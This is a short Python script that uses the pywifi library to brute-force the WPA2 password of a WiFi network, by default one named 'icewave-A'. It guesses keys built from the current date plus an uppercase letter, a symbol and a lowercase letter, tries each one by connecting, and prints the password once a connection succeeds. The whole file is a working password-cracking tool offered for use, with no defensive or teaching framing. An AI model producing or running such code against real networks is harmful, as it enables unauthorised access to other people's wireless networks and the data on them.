import pywifi
import time
import argparse
import datetime
import string

LARGE_ALPHABET_LIST = string.ascii_uppercase
SMALL_ALPHABET_LIST = string.ascii_lowercase
SYMBOL = ["!", "@", "#", "$", "%", "&"]


def crack(ssid):
    print(f"Cracking {ssid}")

    today = datetime.datetime.now().strftime("%Y%m%d")

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP

    for large_alphabet in range(26):
        for small_alphabet in range(26):
            for symbol in range(len(SYMBOL)):
                profile.key = (
                    today
                    + LARGE_ALPHABET_LIST[large_alphabet]
                    + SYMBOL[symbol]
                    + SMALL_ALPHABET_LIST[small_alphabet]
                )
                print(f"Trying {profile.key}")
                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                time.sleep(0.1)
                iface.connect(tmp_profile)
                time.sleep(0.1)
                if iface.status() == pywifi.const.IFACE_CONNECTED:
                    print("Connected!")
                    print(f"Password: {profile.key}")
                    exit()


def main():
    parser = argparse.ArgumentParser(description="Crack Icewave WiFi")
    parser.add_argument(
        "-s", "--ssid", default="icewave-A", type=str, help="SSID=WIFI Name (icewave-A)"
    )
    args = parser.parse_args()

    crack(args.ssid)


if __name__ == "__main__":
    main()
